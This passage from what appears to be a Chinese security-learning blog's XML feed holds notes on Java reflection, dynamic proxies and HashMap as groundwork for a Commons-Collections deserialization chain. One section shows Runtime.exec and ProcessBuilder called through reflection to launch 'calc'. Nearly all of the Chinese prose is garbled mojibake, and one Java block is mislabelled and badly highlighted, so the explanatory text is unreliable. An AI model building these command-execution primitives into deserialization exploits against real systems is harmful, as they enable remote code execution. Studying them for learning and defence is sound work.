<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://novic4.cn/index.php/archives/26.html#cl-4">JavaDerserializeLabs-writeup - noViC4çš„ç¬”è®°æœ¬</a></p>
<p><a href="https://www.cnblogs.com/zpchcbd/p/14934168.html">Java JRMP - zpchcbd - åšå®¢å›­ (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>åºåˆ—åŒ–</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaåˆæ­¥å­¦ä¹ â…¡</title>
    <url>/2022/03/29/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A1/</url>
    <content><![CDATA[<blockquote>
<p>Javaåå°„å†å­¦ä¹ ã€åŠ¨æ€ä»£ç†ï¼ˆæœªå­¦é€ï¼‰ã€CC1â€¦â€¦</p>
</blockquote>
<h3 id="Javaåå°„"><a href="#Javaåå°„" class="headerlink" title="Javaåå°„"></a>Javaåå°„</h3><p><del>ä¸Šæ¬¡åªæ˜¯è·Ÿç€è§†é¢‘æ‰“äº†ä¸€éä»£ç ï¼Œä½†æ˜¯å¾ˆå¤šéƒ½è¿˜ä¸æ‡‚ï¼Œæ‰€ä»¥è¿™æ¬¡å°±æ¥ä»”ç»†è®¤è¯†ä¸€ä¸‹</del></p>
<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264799402020448">å‚è€ƒ</a></p>
<h4 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h4><p>1.Classç±»</p>
<p>æ¯åŠ è½½ä¸€ç§<code>class</code>ï¼ŒJVMå°±ä¼šåˆ›å»ºä¸€ä¸ª<code>Class</code>ï¼Œä¹Ÿå°±è¯´JVMæŒæœ‰çš„æ¯ä¸ªClasså®ä¾‹éƒ½æŒ‡å‘ä¸€ä¸ªæ•°æ®ç±»å‹ï¼Œè€Œå¦‚æœåœ¨ç±»ä¸­æœ‰é™æ€åˆå§‹åŒ–å™¨çš„è¯ï¼ŒJVMå¿…ç„¶ä¼šæ‰§è¡Œè¯¥ç±»çš„é™æ€ä»£ç æ®µï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><code>Class</code>é‡Œé¢å­˜å‚¨ç€ä¸€ä¸ª<code>class</code>çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥ç›´æ¥å»Javaé‡Œé¢æŸ¥çœ‹ä¸€äº›å±æ€§å’Œæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     <span class="comment">//è·å–Stringç±»</span></span><br><span class="line">        Class c = String.class;</span><br><span class="line">        System.out.println(c.getName());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// java.lang.String</span></span><br></pre></td></tr></table></figure>

<p><code>getName</code>|<code>getMethod</code>|<code>getMethods</code>|<code>getClassLoader</code>â€¦â€¦</p>
<p><img src="https://img-blog.csdnimg.cn/c71a43b6415a4c6fb7955a96f2cd863b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p><code>getName()</code>è·å–ç±»å</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line">     <span class="comment">//è·å–Stringç±»</span></span><br><span class="line">        <span class="class"><span class="keyword">Class</span> <span class="title">c</span> = <span class="title">String</span>.<span class="title">class</span>;</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="title">c</span>.<span class="title">getName</span>());</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">// <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">void</span> <span class="title">main</span>(<span class="title">String</span>[] <span class="title">args</span>) <span class="title">throws</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">Class</span> <span class="title">c</span> = <span class="title">Test</span>.<span class="title">class</span>;</span></span><br><span class="line"><span class="class">        <span class="title">String</span> <span class="title">s</span> = &quot;&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="title">c</span>.<span class="title">getName</span>());</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">// <span class="title">demo</span>.<span class="title">Test</span></span></span><br></pre></td></tr></table></figure>

<p><code>getMethod(String)</code> è·å–å…¶ä¸­ä¸€ä¸ªæ–¹æ³•</p>
<p><code>getMethods()</code> è¿”å›å¸¦æœ‰æ‰€æœ‰æ–¹æ³•çš„æ•°ç»„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Test.class;</span><br><span class="line">        String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(c.getMethod(<span class="string">&quot;exp&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// public void demo.Test.exp() throws java.lang.Exception</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Test.class;</span><br><span class="line">        String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(c.getMethods()[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//public void demo.Test.exp() throws java.lang.Exception</span></span><br></pre></td></tr></table></figure>

<p><code>getClass</code> è·å–ç±» | <code>forName</code> å½“çŸ¥é“ç±»çš„å…¨åçš„æ—¶å€™</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Class c = Test.class;</span><br><span class="line">      System.out.println(c.toString());</span><br><span class="line">     <span class="comment">//class demo.Test</span></span><br><span class="line">      Class c1 = Class.forName(<span class="string">&quot;demo.Test&quot;</span>);</span><br><span class="line">      System.out.println(c1.toString());</span><br><span class="line"><span class="comment">//class demo.Test</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><code>getModifiers()</code>è¿”å›ç±»ã€å±æ€§ã€æ–¹æ³•çš„ä¿®é¥°ç¬¦</p>
<table>
<thead>
<tr>
<th>ä¿®é¥°ç¬¦</th>
<th>å¯¹åº”çš„intç±»å‹</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>1</td>
</tr>
<tr>
<td>private</td>
<td>2</td>
</tr>
<tr>
<td>protected</td>
<td>4</td>
</tr>
<tr>
<td>static</td>
<td>8</td>
</tr>
<tr>
<td>final</td>
<td>16</td>
</tr>
<tr>
<td>synchronized</td>
<td>32</td>
</tr>
<tr>
<td>volatile</td>
<td>64</td>
</tr>
<tr>
<td>transient</td>
<td>128</td>
</tr>
<tr>
<td>native</td>
<td>256</td>
</tr>
<tr>
<td>interface</td>
<td>512</td>
</tr>
<tr>
<td>abstract</td>
<td>1024</td>
</tr>
<tr>
<td>strict</td>
<td>2048</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Test.class;</span><br><span class="line">        String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(c.getModifiers());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p><code>newInstance()</code>å¯ä»¥å®ä¾‹åŒ–ç±» ï¼Œä½†æ˜¯åªä¼šè°ƒç”¨ç±»çš„æ— å‚æ„é€ æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Test t1 = <span class="keyword">new</span> Test();</span><br><span class="line">    Class c = t1.getClass();</span><br><span class="line">    Test test = (Test) c.newInstance();</span><br><span class="line">    test.exp();</span><br><span class="line">    System.out.println(c.newInstance());</span><br><span class="line">    Class c1 = Class.forName(<span class="string">&quot;demo.Test&quot;</span>);</span><br><span class="line">    System.out.println(c1.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getField(String)</code>| <code>getDeclareField(String)</code>|<code>getFields()</code> è·å–ç”±publicä¿®é¥°çš„å±æ€§ | <code>getDeclaredFields()</code>è·å–æ‰€æœ‰å±æ€§</p>
<p><code>getConstructor</code> | <code>getConstructors</code> | <code>getDeclaredConstructor</code> | <code>getDeclaredConstructors</code> å¯ä»¥åˆ©ç”¨æ„é€ æ–¹æ³•è¿›è¡Œå®ä¾‹åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/d4b66cc286514ce6b0022cfb7bd9a40e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h4><h5 id="1-å®ä¾‹åŒ–"><a href="#1-å®ä¾‹åŒ–" class="headerlink" title="1.å®ä¾‹åŒ–"></a>1.å®ä¾‹åŒ–</h5><blockquote>
<p>è¿™â¾¥ä¹Ÿéœ€è¦æ³¨æ„â¼€ç‚¹ï¼Œåœ¨JDK1.9å¾€ä¸Šï¼Œä¸å†ä½¿â½¤newInstance()ã€‚</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// forNameå¯æ“ä½œæ—¶</span></span><br><span class="line">Class.forName(<span class="string">&quot;&quot;</span>);</span><br><span class="line">Class.forName(<span class="string">&quot;&quot;</span>).newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å·²ç»å­˜åœ¨è¯¥å¯¹è±¡ ä½†æ˜¯æˆ‘ä»¬æ§åˆ¶ä¸äº†è¯¥å¯¹è±¡çš„æ—¶å€™</span></span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">cl.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ©ç”¨æ„é€ æ–¹æ³•</span></span><br><span class="line">cl.getConstructor().newInstance();</span><br></pre></td></tr></table></figure>

<h5 id="2-è°ƒç”¨æ–¹æ³•"><a href="#2-è°ƒç”¨æ–¹æ³•" class="headerlink" title="2.è°ƒç”¨æ–¹æ³•"></a>2.è°ƒç”¨æ–¹æ³•</h5><p><img src="https://img-blog.csdnimg.cn/75b1ce41e97c45faa08ee77d1ad0a1ba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ— å‚æ•°</span></span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Method method = cl.getMethod(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">method.invoke(cl.getConstructor().newInstance());</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/124b138b0c634bf9b799023428971721.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å­˜åœ¨å‚æ•°</span></span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Method method = cl.getMethod(<span class="string">&quot;exp&quot;</span>, String.class);</span><br><span class="line">method.invoke(cl.getConstructor().newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/228a4100f4834a7cb1e80bc4fbee9c64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h5 id="3-è®¿é—®ç§æœ‰ï¼ˆå±æ€§ã€æ–¹æ³•ï¼‰"><a href="#3-è®¿é—®ç§æœ‰ï¼ˆå±æ€§ã€æ–¹æ³•ï¼‰" class="headerlink" title="3.è®¿é—®ç§æœ‰ï¼ˆå±æ€§ã€æ–¹æ³•ï¼‰"></a>3.è®¿é—®ç§æœ‰ï¼ˆå±æ€§ã€æ–¹æ³•ï¼‰</h5><p>å…³é”®ï¼š<code>setAccessible()</code>|<code>getDeclared</code></p>
<p>ç§æœ‰å±æ€§ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Field field = cl.getDeclaredField(<span class="string">&quot;score&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(cl.newInstance(),<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>ç§æœ‰æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">Class cl = test.getClass();</span><br><span class="line">Method method = cl.getDeclaredMethod(<span class="string">&quot;exp&quot;</span>, String.class);</span><br><span class="line">method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">method.invoke(cl.getConstructor().newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="4-å‘½ä»¤æ‰§è¡Œæ–¹æ³•"><a href="#4-å‘½ä»¤æ‰§è¡Œæ–¹æ³•" class="headerlink" title="4.å‘½ä»¤æ‰§è¡Œæ–¹æ³•"></a>4.å‘½ä»¤æ‰§è¡Œæ–¹æ³•</h5><p><code>Runtime</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cl = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method method = cl.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">Method method1 = cl.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Object o = method1.invoke(cl);</span><br><span class="line">method.invoke(o, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>ProcessBuilder</code></p>
<p>ProcessBuilderé€šè¿‡å®ä¾‹åŒ–çš„æ—¶å€™ä¼ å…¥<code>command</code>è°ƒç”¨<code>start</code>æ–¹æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cl = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">cl.getMethod(<span class="string">&quot;start&quot;</span>).invoke(cl.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br><span class="line"><span class="comment">// ä½†æ˜¯è¦æ±‚æœ‰ArraysåŒ…</span></span><br></pre></td></tr></table></figure>

<p><code>varargs</code>å¯å˜é•¿å‚æ•°ï¼Œç”¨äºå½“æˆ‘ä»¬æƒ³åˆ©ç”¨ProcessBuilderçš„å¦ä¸€ä¸ªæ„é€ æ–¹æ³•çš„æ—¶å€™</p>
<p>Pç¥å¦‚æ˜¯è¯´ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/0fd65f86658445dfaa297ba7e51c8069.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;));</span><br><span class="line"><span class="comment">// ä½†æ˜¯åé¢çš„ new String[][]&#123;&#123;&quot;calc&quot;&#125;&#125; è¯¥æ€ä¹ˆç”¨åå°„å‘¢</span></span><br></pre></td></tr></table></figure>

<h3 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="- åŠ¨æ€ä»£ç†"></a>- åŠ¨æ€ä»£ç†</h3><p>Javaä¸­é€šå¸¸ä¼šæœ‰é™æ€ä»£ç†ã€åŠ¨æ€ä»£ç†å’Œcglibä»£ç†</p>
<p><strong>é™æ€ä»£ç†</strong>å°±æ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„ï¼Œåˆ©ç”¨<code>implements</code>å…³é”®å­—åˆ›å»ºå®ç°ç±»å®ç°æŸä¸€ä¸ªæ¥å£ï¼Œç„¶åå†é€šè¿‡å®ä¾‹åŒ–è¯¥ç±»ä»è€Œå®ç°å¯¹æ¥å£çš„è°ƒç”¨ï¼Œæœ‰æ—¶ä¹Ÿä¼šé€šè¿‡åˆ›å»ºå¦ä¸€ä¸ªä»£ç†ç±»å®ç°å¯¹å‰ä¸€ä¸ªç±»çš„è°ƒç”¨</p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TestIns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">TestIns</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TestIns testIns = <span class="keyword">new</span> Test();</span><br><span class="line">        testIns.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œ<strong>åŠ¨æ€ä»£ç†</strong>å¹¶ä¸éœ€è¦åˆ›å»ºä»£ç†ç±»ï¼Œå¯ä»¥é€šè¿‡JDKæä¾›çš„<code>Proxy.newProxyInstance()</code>å’Œ<code>InvocationHandler</code>å®ç°å®ä¾‹åŒ–æ¥å£ï¼Œè°ƒç”¨æ¥å£çš„ç±»</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestTwo</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> InvocationHandler() &#123; <span class="comment">// ç”¨äºå®ç°è°ƒç”¨æ¥å£çš„æ–¹æ³•</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;test&quot;</span>))&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;ttest&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¼ºåˆ¶è½¬åŒ– å®ç°å¯¹æ¥å£çš„å®ä¾‹åŒ–</span></span><br><span class="line">        TestIns testIns = (TestIns) Proxy.newProxyInstance(</span><br><span class="line">                TestIns.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;TestIns.class&#125;,</span><br><span class="line">                handler);</span><br><span class="line">        testIns.test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">TestIns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç°åœ¨æ¥è¯•ç€è·Ÿè¿›äº†è§£ä¸€ä¸‹<code>Proxy.newProxyInstance</code>å’Œ<code>InvocationHandler</code></p>
<p><code>InvocationHandler</code>æ˜¯ç”±ä»£ç†å®ä¾‹çš„è°ƒç”¨å¤„ç†ç¨‹åºå®ç°çš„æ¥å£ã€‚æ¯ä¸ªä»£ç†å®ä¾‹éƒ½æœ‰ä¸€ä¸ªå…³è”çš„è°ƒç”¨å¤„ç†ç¨‹åºã€‚åœ¨ä»£ç†å®ä¾‹ä¸Šè°ƒç”¨æ–¹æ³•æ—¶ï¼Œæ–¹æ³•è°ƒç”¨å°†è¢«ç¼–ç å¹¶å‘é€åˆ°å…¶è°ƒç”¨å¤„ç†ç¨‹åºçš„invokeæ–¹æ³•ã€‚æŒ‰ç…§ä¸ªäººçš„ç†è§£ï¼Œå³å¯ä»¥åœ¨InvocationHandleré‡Œé¢å¯¹æ¥å£çš„æ–¹æ³•è¿›è¡Œé‡è½½æˆ–è€…å…¶ä»–æ“ä½œã€‚</p>
<p><code>Proxy.newProxyInstance</code>çš„å®šä¹‰ï¼ˆå‚æ•°åˆ†åˆ«æ˜¯ç±»åŠ è½½å™¨ã€ä¸€ä¸ªå®ä¾‹ä»¥åŠä¸€ä¸ªInvocationHandlerï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span></span></span><br></pre></td></tr></table></figure>

<p><a href="https://qiankunli.github.io/2020/04/09/java_dynamic_proxy.html">å‚è€ƒ</a>æš‚æ—¶å®¡è®¡javaçš„ä»£ç çœŸçš„ç†è§£ä¸èƒ½ï¼Œ<em>è®°å·ï¼ï¼ï¼</em></p>
<h3 id="Map-HashMapâ€¦â€¦"><a href="#Map-HashMapâ€¦â€¦" class="headerlink" title="Map/HashMapâ€¦â€¦"></a>Map/HashMapâ€¦â€¦</h3><blockquote>
<p>å› ä¸ºå¯¹Mapç±»ä¸ç†Ÿæ‚‰çš„è¯ å¾ˆéš¾çœŸçš„æ‡‚ä¸‹é¢çš„é“¾å­ï¼Œæ‰€ä»¥å°±å…ˆæµ…æµ…äº†è§£ä¸€ä¸‹</p>
</blockquote>
<p><code>Map</code>æ˜¯ä¸€ä¸ªæ¥å£ä¹Ÿå¯è¯´æ˜¯é›†åˆç±»ï¼Œå…¶ä¸­&lt;&gt;ä»£è¡¨ä¸ºæ³›å‹ï¼Œè€ŒMapä¸ºé”®å€¼å¯¹çš„é›†åˆï¼Œå…¶ä¸­æ¯ä¸€ä¸ªé”®æ˜ å°„åˆ°ä¸€ä¸ªå€¼</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Map</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åŸºæœ¬æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>; <span class="comment">// è¿”å›æ˜ å°„é”®å€¼å¯¹çš„ä¸ªæ•°</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>; <span class="comment">// åˆ¤æ–­é›†åˆç±»æ˜¯å¦ä¸ºç©º å³ä¸åŒ…å«ä»»ä½•é”®å€¼å¯¹åˆ™è¿”å›true</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span></span>; <span class="comment">// åˆ¤æ–­é›†åˆç±»ä¸­æ˜¯å¦åŒ…å«è¯¥æ˜ å°„</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsValue</span><span class="params">(Object value)</span></span>; </span><br><span class="line"><span class="function">V <span class="title">get</span><span class="params">(Object key)</span></span>; <span class="comment">// è¿”å›keyå¯¹åº”çš„value</span></span><br><span class="line"><span class="function">V <span class="title">put</span><span class="params">(K key, V value)</span></span>; <span class="comment">// å°†æŒ‡å®šçš„é”®å’Œå€¼äº’ç›¸å…³è” ä¼šè¿”å›ä¸é”®å…³è”çš„ä¸Šä¸€ä¸ªå€¼æˆ–è€…å¦‚æœä¸é”®å…³è”çš„ä¸Šä¸€ä¸ªå€¼ä¸ºnullçš„è¯ä¼šè¿”å›null</span></span><br><span class="line"><span class="function">V <span class="title">remove</span><span class="params">(Object key)</span></span>; <span class="comment">// å¦‚æœåŒ…å«è¯¥keyå…³è”çš„æ˜ å°„åˆ™ç›´æ¥åˆ é™¤ï¼Œå¹¶è¿”å›ä¹‹å‰ä¸keyå…³è”çš„valueæˆ–è€…null</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>; <span class="comment">// æ¸…é™¤é›†åˆ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>; <span class="comment">// è¿”å›è¯¥æ˜ å°„çš„å“ˆå¸Œå€¼</span></span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>è€Œå°±åƒä¸Šé¢è®²åˆ°çš„ä¸€æ ·ï¼Œ<code>HashMap</code>å°±æ˜¯æ¥å£<code>Map</code>çš„ä¸€ä¸ªå®ç°ç±»ï¼Œåœ¨é‡Œé¢å®ç°äº†<code>Map</code>çš„æ–¹æ³•</p>
<p><code>HashMap</code></p>
<p>å¥½å‡ ä¸ªå†…éƒ¨ç±»ç°åœ¨å°±å…ˆä¸çœ‹äº†ï¼Œç»§ç»­çœ‹åé¢çš„</p>
<p>æœ‰å››ä¸ªæ„é€ æ–¹æ³•<code>HashMap</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;  <span class="comment">// å‚æ•°ä¸èƒ½ä¸ºè´Ÿæ•°</span></span><br><span class="line">    â€¦â€¦</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">    <span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity); <span class="comment">// è¿”å›initialCapacityçš„ä¸¤å€å¹‚ã€‚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR); <span class="comment">// å°†å¸¸é‡å’Œintä¸€èµ·ä¼ ï¼Œé‡æ–°è°ƒç”¨ä¸€æ¬¡ä¸Šé¢çš„æ„é€ æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// all other fields defaulted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

